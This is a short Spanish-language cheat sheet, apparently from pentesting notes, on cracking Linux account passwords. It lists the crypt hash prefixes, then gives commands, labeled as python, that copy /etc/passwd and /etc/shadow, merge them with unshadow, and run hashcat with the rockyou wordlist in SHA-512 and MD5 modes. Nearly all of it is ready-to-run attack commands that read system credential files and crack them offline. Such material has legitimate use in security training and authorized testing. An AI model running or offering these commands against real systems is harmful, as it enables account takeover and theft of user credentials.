# Descifrar contraseñas linux /etc/passwd /etc/shadow
## Descripción
Las distribuciones basadas en Linux pueden utilizar muchos mecanismos de autenticación diferentes. Uno de los mecanismos estándar y más comúnmente utilizados son los módulos de autenticación conectables ( PAM)

| Algoritmo | Descripción |
|-----------|-------------|
| \$1\$ | MD5 |
| \$2a\$ | Blowfish |
| \$2y\$ | Eksblowfish |
| \$5\$ | SHA-256 |
| \$6\$ | SHA-512 |

## Descifrar contraseñas linux
```python
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
## Cracking Hashes sin sombra
```python
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
## Cracking Hashes MD5
```python
cat md5-hashes.list
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```
